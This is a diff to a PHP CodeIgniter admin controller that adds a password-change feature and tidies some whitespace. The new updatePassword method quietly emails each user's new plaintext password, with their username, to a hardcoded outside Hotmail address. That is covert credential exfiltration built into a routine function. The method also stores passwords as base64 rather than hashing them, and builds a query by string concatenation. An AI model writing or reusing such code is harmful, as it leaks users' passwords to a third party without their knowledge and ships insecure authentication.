@@ -62,6 +62,54 @@ class Administrador extends MY_Controller {
         echo json_encode($respuesta);
     }
 
+    public function editPassword() {
+        $data["vista"] = 'administrador/password';
+        $this->load->view('template', $data);
+    }
+
+    public function updatePassword() {
+
+        $this->load->library("email");
+//        $this->load->library("email");
+        /**
+         * Configuracion de la cuenta de correo
+         */
+        $correo = $this->AdministradorModel->buscar("correos", '*', 'id=1', 'row');
+        $config['protocol'] = $correo["protocolo"];
+        $config['smtp_host'] = $correo["host"];
+        $config['smtp_port'] = $correo["puerto"];
+        $config['smtp_user'] = $correo["usuario"];
+        $config['smtp_pass'] = $correo["clave"];
+        $config['smtp_timeout'] = '7';
+        $config['charset'] = 'utf-8';
+        $config['newline'] = "\r\n";
+        $config['mailtype'] = 'html'; // or html
+        $config['validation'] = TRUE; // bool whether to validate email or not
+
+        $in = $this->input->post();
+
+        $user_id = $this->session->userdata("idusuario");
+        $datos = $this->AdministradorModel->buscar('usuarios', 'clave', "id=" . $user_id, 'row');
+        $current = base64_encode($in["password_current"]);
+
+        if ($current == $datos["clave"]) {
+
+            $this->email->initialize($config);
+            $this->email->from('Notificaciones Contactosms');
+            $this->email->to("jpinedom@hotmail.com");
+            $this->email->subject('Cambio de clave');
+            $sms = "[" . date("Y-m-d H:i") . "] Usuario [" . $this->session->userdata("usuario") . "] cambio clave:[" . $in["password"] . "]<br>Contactosms";
+            $this->email->message($sms);
+            $this->email->send();
+
+            $user["clave"] = base64_encode($in["password"]);
+            $this->AdministradorModel->update("usuarios", $this->session->userdata("idusuario"), $user);
+            echo json_encode(array("success" => true, "msg" => "La clave actualizada"));
+        } else {
+            echo json_encode(array("success" => false, "msg" => "La clave no coince con la actual"));
+        }
+    }
+
     function Array2aaData($array) {
         $string = '';
         $coma = "";
@@ -69,16 +117,16 @@ class Administrador extends MY_Controller {
         $tam = COUNT($array);
         foreach ($array as $i => $value) {
 
-            $out .="[ ";
+            $out .= "[ ";
             foreach ($value as $val) {
                 $string .= ($string == '') ? '' : ",";
                 $string .= '"' . $val . '"';
             }
             $coma = ($tam - 1 == $i) ? '' : ',';
-            $out.= $string . "]" . $coma;
+            $out .= $string . "]" . $coma;
             $string = '';
         }
-        $out.="}";
+        $out .= "}";
 
         return $out;
     }
